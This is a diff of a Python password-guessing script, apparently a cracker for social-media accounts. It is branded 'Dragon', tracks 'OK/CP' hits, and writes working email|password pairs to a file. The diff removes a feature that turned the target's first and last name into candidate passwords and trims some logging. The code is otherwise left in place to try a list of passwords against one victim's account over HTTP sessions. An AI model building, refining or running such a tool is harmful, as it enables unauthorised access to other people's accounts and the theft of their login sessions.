@@ -27,7 +27,7 @@ class CookieGetter:
     def __init__(self, id_list):
         self.id = id_list
     
-    def methodA(self, sid, name, psw):
+    def methodA(self, sid, psw):
         try:
             global oks, cps, loop
             
@@ -35,17 +35,8 @@ class CookieGetter:
             sys.stdout.write(f"\r {S}[Dragon] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             
-            # Parse name
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            
             # Try each password
-            for pw in psw:
-                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
-                
+            for ps in psw:
                 print(f"\n{A}[*] Trying password: {ps}{W}")
                 
                 with requests.Session() as session:
@@ -110,12 +101,11 @@ class CookieGetter:
                         )
                         
                         print(f"{A}[*] Response Status: {response.status_code}{W}")
-                        print(f"{A}[*] Response Length: {len(response.text)}{W}")
                         
                         # Try to parse JSON
                         try:
                             q = response.json()
-                            print(f"{A}[*] Response JSON Keys: {list(q.keys())}{W}")
+                            print(f"{A}[*] Response Keys: {list(q.keys())}{W}")
                             
                             # Debug: print full response for first attempt
                             if loop == 0:
@@ -123,7 +113,7 @@ class CookieGetter:
                                 print(json.dumps(q, indent=2)[:500])
                             
                         except json.JSONDecodeError:
-                            print(f"{R}[!] Failed to parse JSON. Response text:{W}")
+                            print(f"{R}[!] Failed to parse JSON{W}")
                             print(response.text[:500])
                             continue
                         
@@ -156,7 +146,7 @@ class CookieGetter:
                                     f.write(f'{sid}|{ps}\n')
                                 break
                         else:
-                            print(f"{A}[!] Unknown response format{W}")
+                            print(f"{A}[!] Unknown response{W}")
                             continue
                             
                     except requests.exceptions.Timeout:
@@ -171,9 +161,6 @@ class CookieGetter:
             
             loop += 1
             
-        except requests.exceptions.ConnectionError:
-            # Retry on connection error
-            self.methodA(sid, name, psw)
         except Exception as e:
             print(f"{R}[!] Fatal Error: {str(e)}{W}")
             loop += 1
@@ -187,13 +174,9 @@ if __name__ == "__main__":
     # Get email input
     email = input(f"{W}[{S}+{W}] Enter your email/phone: {S}").strip()
     
-    # Get name input
-    name = input(f"{W}[{S}+{W}] Enter full name (First Last): {S}").strip()
-    
     # Get passwords
-    print(f"\n{W}[{S}+{W}] Enter passwords (one per line, press Enter twice when done):{S}")
+    print(f"\n{W}[{S}+{W}] Enter passwords (one per line, press Enter twice when done):{S}\n")
     passwords = []
-    print(f"{A}Tip: Use 'first', 'last', 'First', 'Last', 'Name', 'name' as placeholders{W}\n")
     
     while True:
         pw = input(f"{W}Password {len(passwords)+1}: {S}").strip()
@@ -208,7 +191,6 @@ if __name__ == "__main__":
     # Confirm
     print(f"\n{W}═══════════════════════════════════════")
     print(f"{W}Email/Phone: {S}{email}{W}")
-    print(f"{W}Name: {S}{name}{W}")
     print(f"{W}Passwords: {S}{len(passwords)} passwords loaded{W}")
     print(f"{W}═══════════════════════════════════════\n")
     
@@ -220,7 +202,7 @@ if __name__ == "__main__":
         # Create instance and run
         id_list = [email]
         getter = CookieGetter(id_list)
-        getter.methodA(email, name, passwords)
+        getter.methodA(email, passwords)
         
         # Final results
         print(f"\n\n{W}═══════════════════════════════════════")
